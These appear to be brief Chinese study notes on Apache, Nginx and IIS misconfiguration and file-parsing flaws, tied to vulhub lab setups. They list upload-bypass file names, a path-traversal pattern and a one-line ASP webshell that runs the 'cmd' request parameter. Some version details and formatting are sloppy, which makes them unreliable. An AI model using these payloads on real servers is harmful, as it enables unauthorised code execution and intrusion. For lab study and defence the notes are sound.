---
title: Security Misconﬁguration
category: Web Security
date: 2024-3-13
---

## Apache解析漏洞

```
# 自行添加了handler
AddHandlerapplication/x-httpd-php.php

使得1.php.xxx #被当成1.php解析

# 靶场环境
vulhub/httpd/apache_parsing_vulnerability
```

## Apache目录遍历漏洞

```
# 允许了目录列出
Options +Indexes +FollowSymLinks +ExecCGI
```

## Nginx目录穿越漏洞

```
# 配置别名时缺少了/

/file ->/home/ 
被构造成:
/file../ ->/home/../

# 靶场环境
vulhub/nginx/insecure-configuration
```

## Nginx解析漏洞

```php
# Nginx <8.03
* **畸形解析漏洞**
xxx.jpg/xxx.php  **# 被当成php解析

# Nginx 0.5 0.6 0.7<=0.7.65 0.8<=0.8.37
* %00解析漏洞
win xxx.jpg%00.php 
Linux xxx.jpg%20%00.php # 被当成php解析**
```

## IIS解析漏洞

```php
# IIS 5.x/6.0 

* 目录解析漏洞
/xxx.asp/xxx.xxx #xxx.asp下的所有后缀类型的文件都会被解析成asp文件
asp一句话木马 <%execute(request("cmd"))%>

* 文件解析漏洞
xxx.php;.jpg # 被当成php文件解析

# **IIS 7.0/7.5**
* **畸形解析漏洞
xxx.jpg/xxx.php # 被当成php解析**
```
